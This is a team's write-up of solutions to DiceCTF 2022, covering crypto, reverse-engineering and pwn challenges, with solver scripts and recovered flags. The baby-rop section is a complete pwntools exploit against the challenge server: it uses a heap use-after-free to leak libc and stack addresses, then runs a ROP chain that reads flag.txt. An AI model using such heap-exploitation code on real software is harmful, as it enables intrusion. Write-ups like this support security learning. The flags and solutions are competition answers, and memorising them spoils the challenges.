# DiceCTF 2022
 - [DiceCTF 2022](#dicectf-2022)
   - [crypto](#crypto)
     - [pow-pow](#pow-pow)
   - [rev](#rev)
     - [hyperlink](#hyperlink)
     - [taxes](#taxes)
       - [DG4-A](#dg4-a)
       - [DG4-B](#dg4-b)
       - [DG4-C (DG6)](#dg4-c-dg6)
       - [DG4-D (DG7)](#dg4-d-dg7)
   - [pwn](#pwn)
     - [baby-rop](#baby-rop)


## crypto

### pow-pow
https://gist.github.com/EricTsengTy/067d9abd0ea78debe01b862ac5ccc35f
```
Find b that
    b  =  2^(2^k)
    h  =  1
    g  =  b^M
    m  =  H(g, h)
s.t.
    m | M
then we can get pi by
    pi =  b^(-(M // m) * r)
where r = 2^(2^64) % m
```

## rev

### hyperlink

```python=
import json

with open('hyperlink.json', 'r') as f:
    data = json.load(f)

charset = 'abcdefghijklmnopqrstuvwxyz{}_'

def run_chain(links, start):
    current = start
    for link in links:
        current = int(''.join(
            str(int(current & component != 0))
            for component in link
        ), 2)
    return current

current = data['start']
flag = 'dice{'
chain = [data['links'][c] for c in flag]
current = run_chain(chain, data['start'])

while (current & data['target']) != data['target'] and len(flag) < 34:
    tmp = current
    count = 0
    while (tmp & 1 == 1) or (tmp & 2 == 0):
        tmp >>= 4
        count += 4
    candidate = []
    for c in charset:
        if data['links'][c][-count-1] == (3 << count):
            candidate.append(c)
    assert len(candidate) == 1
    chain = [data['links'][c] for c in candidate[0]]
    current = run_chain(chain, current)
    flag += candidate[0]

print(flag)

# dice{everything_is_linear_algebra}
```

### taxes

#### DG4-A

```python=
a = [68, 105, 99, 101, 71, 97, 110, 103, 27, 97, 110, 21, 101, 71, 28, 2]
b = [45, 7, 23, 86, 53, 15, 90, 11, 68, 19, 93, 99, 0, 41, 105, 103]

for x, y in zip(a, b):
    print(chr(x ^ y), end='', flush=True)
print()

# int3rn4l_r3venue
```

#### DG4-B
[SCRIPT](https://gist.github.com/paulhuangkm/c4eff7e4388eb450b4a73fdd28086476)

```
_serv1ce_m0re_l1
```

#### DG4-C (DG6)

```c=
// All credits to Jwang
#include<stdio.h>
#include<stdlib.h>

int main(){
  unsigned long long int S1 = 7453001392616335684ULL; //low
  unsigned long long int S2 = 7451565559246643524ULL; //high
  unsigned long long int T1_1 = 0;
  unsigned long long int T1_2 = 0;
  unsigned long long int T2_1 = 0;
  unsigned long long int T2_2 = 0;
  for(unsigned long long int x=0;x<1000000000000ULL;x++){
    if((x%1000000000)==0) printf("%llu\n",x);
    T1_1 = (S1>>1)|((S2&1)<<63);
    T1_2 = (S2>>1)|((S1&1)<<63);
    T1_1|=S1;
    T1_2|=S2;
    T2_1 = (S1<<1)|(S2>>63);
    T2_2 = (S2<<1)|(S1>>63);
    S1 = T1_1^T2_1;
    S2 = T1_2^T2_2;
  }
  printf("%llu %llu",S2,S1);
  return 0;
}

// ke_ink_rev3rs1ng
```

#### DG4-D (DG7)

```python=
As = [343039,2733569919,3492393040,912986159,2320019439,1372387751,
2734051748,4183136871,4131490973,3331550901,4039091427,2011829293,
4064521974,2542382404,662680445,4244429757,1907156173,3140073386,
1726859438,1527969902,3860913000,2876239582,2799116963,1608231135,
2396613870,3548248332,3068050105,2024408303,4100972441,2407182277,
1794763355,3196154075,3732239213,394919766,2197149293,3185198778,
3952881150,3885164379,234597444,642322623,3528601129,3969777425,
2075901355,2546415827,4029539571,2740974388,2756514805,4149925230,
319648567,1622441043,431984786,1313540411,4240996349,3021682383,
3873385171,3217995502,2130511546,347240441,3504272675,1852839691,
4198741748,384402019,1073674067,2308274366,1649593849,1580693221,
1891223314,4277757085,356677631,3587165417,785852082,1844099611,
2096069838,2075488364,635386633,3098228429,3426412026,694611443,
1308405653,3435931359,3870904043,3193145087,1325367455,3757926298,
2069475259,2255190751,1845093732,2805545695,2943133433,1824259504,
2142133580,2644404398,430366110,2010343702,2379982082,4196354527,
4267409331,2765708970,3187365580,1831014719,2980964048,3155948591,
1474999319,3019402471,3811335997,2886197802,2478524056,1563617651,
2361875522,691797586,2011659610,232149174,1825673179,1093592609,
822015370,4000387228,4160386814,2911296421,4067921206,3662955519,
4183412649,1714940895,1804170151,2146074317,4265857463,1748298979,
2448886932,4276199443,1525903074,970392251,1340077627,3553265758,
4071857050,3428769418,422692964,3711627571,1215623161,1342152068,
2008517966,2615766190,3174211036,84635794,1811810082,4242345917,
4211381217,1544282103,4226339213,2646887223,1238817226,1765229974,
2650691895,934669108,4088930102,1827990831,322129065,1570925947,
4140256803,3782718380,4219345613,2010167885,714423230,2842032436,
2482890916,4079113151,3988776550,3718830182,2608739728,3651564519,
3956746680,1965976605,2310035390,1878613359,3745949280,3662274430,
937860498,3730106990,17759318,3799514325,3436051645,2614409852,
3745109800,2606620258,221604262,4231217596,4016557533,1254453423,
1473231509,1888270285,3442580406,3061638831,2481107534,4294244799,
4234455904,514456518,855137327,3688592311,970897802,1765712340,
3218843744,1066530491,3059857109,587069669,997953869,4200885116,
371843045,330774306,3278820337,1073515613,1926869885,3444893756,
3618851621,3257098035,913061864,718795725,2766649823,3016551502,
3939630008,3798815605]

A = 0
for a in As:
    A <<= 32
    A += a

FLAG = ''

def enc(b):
    B = 0
    for c in b[::-1]:
        B *= 128
        B += c
    return B

def dec(B):
    b = b''
    while B != 0:
        b += (B & 127).to_bytes(1, byteorder='little')
        B >>= 7
    return b

def DG7(A1,B1):
    P29 = 1
    count = 0
    while P29 != 0:
        count += 1
        P5 = A1 & 3
        if P5 == 0: # end
            P82 = B1
            P29 = 0
        elif P5 == 1: # push to stack
            P29 = A1 >> 9
            P82 = (B1 << 7) + ((A1 >> 2) & 127)
        elif P5 == 2: # check if top of stack is 0
            if B1 & 127 == 0:
                P29 = A1 >> 2
                P82 = B1
            else:
                P29 = 0
                P82 = 0
        else: # arithmetic operation on top 2 of stack
            P29 = A1 >> 4
            P55 = (A1 >> 2) & 3
            P61 = (B1 >> 14) << 7

            # top 2 elements on stack
            P62 = B1 & 127
            P64 = (B1 >> 7) & 127
            if P55 == 0:
                P82 = P61 + ((P64 + P62) & 127)
            elif P55 == 1:
                P82 = P61 + ((P64 - P62) & 127)
            elif P55 == 2:
                P82 = P61 + ((P64 * P62) & 127)
            else:
                P82 = P61 + ((P64 ^ P62) & 127)

        A1 = P29
        B1 = P82
    return count

while len(FLAG) < 16:
    charset = ''.join(chr(c) for c in range(32, 128))
    for char in charset:
        INP = (FLAG.encode() + char.encode()).ljust(16, b'a')
        N = enc(INP)

        if DG7(A, N) > 68 * (len(FLAG) + 1):
            FLAG += char
            print(char, end='', flush=True)

print()

# _simul4ti0n_lmao
```

## pwn

### baby-rop

```python
from pwn import *
context.arch = 'amd64'

elf = ELF('./babyrop')
libc = ELF('./libc.so.6')

# p = elf.process(env = {'LD_PRELOAD': './libc.so.6'})
p = remote('mc.ax', 31245)

def create(idx, len, cont):
    p.recvuntil(b'command: ')
    p.sendline(b'C\n' + str(idx).encode() + b'\n' + str(len).encode())
    p.recvuntil(b'string: ')
    p.send(cont)

def free(idx):
    p.recvuntil(b'command: ')
    p.sendline(b'F\n' + str(idx).encode())
    p.recvuntil(b'index: ')

def read(idx):
    p.recvuntil(b'command: ')
    p.sendline(b'R\n' + str(idx).encode())
    p.recvuntil(b'index: ')

def write(idx, cont):
    p.sendline(b'W\n' + str(idx).encode())
    p.recvuntil(b'string: ')
    p.send(cont)

def exit():
    p.recvuntil(b'command: ')
    p.send(b'E')
    p.sendline(b'1')

def parse_hex():
    p.recvuntil(b'hex-encoded bytes\n')
    ls = p.recvline()[:-1].split(b' ')[1:]
    lb = []
    for i in range(len(ls) // 8):
        x = int(ls[i * 8 + 7], 16)
        for o in range(6, -1, -1):
            x <<= 8
            x += int(ls[i * 8 + o], 16)
        lb.append(x)
    return lb

create(0, 0x10, b'a')
for i in range(1, 9):
    create(i, 0x80, b'a')

for i in range(8, 1, -1):
    free(i)

free(0)
free(1)

for i in range(2, 7):
    create(i, 0x10, p64(0x8))

read(1)
lh = parse_hex()
libc_leak = lh[0] - 0x30

def ch_ptr(ptr, len):
    write(6, p64(len)+ p64(ptr))

libc_base = libc_leak - 0x1f4c90
libc.address = libc_base

environ_off = 0x1fcec0
ch_ptr(libc_base + environ_off, 0x8)
read(0)
lh = parse_hex()
stack_leak = lh[0]
ret_addr = stack_leak - 0x140

buf = 0x404100
buf2 = 0x404300
flag_addr = 0x404500
flag_buf = 0x404600

leave_ret = 0x00000000004012da
pop_rdi = 0x000000000002d7dd + libc_base
pop_rsi = 0x000000000002eef9 + libc_base
pop_rdx = 0x00000000000d9c2d + libc_base
pop_rcx = 0x0000000000110f8b + libc_base
rop = flat([buf2, pop_rdi, flag_addr, pop_rsi, 0, pop_rdx, 0, libc.symbols['open']
            , pop_rdi, 3, pop_rsi, flag_buf, pop_rdx, 0x100, libc.symbols['read']
            , pop_rdi, 1, pop_rsi, flag_buf, pop_rdx, 0x100, libc.symbols['write']])

ch_ptr(flag_addr, 0x30)
write(0, b'./flag.txt')

ch_ptr(buf, len(rop))
write(0, rop)

ch_ptr(ret_addr - 0x8, 0x10)
write(0, p64(buf) + p64(leave_ret))
exit()

p.interactive()

# main_arena = __malloc_hook - 0x7500
```
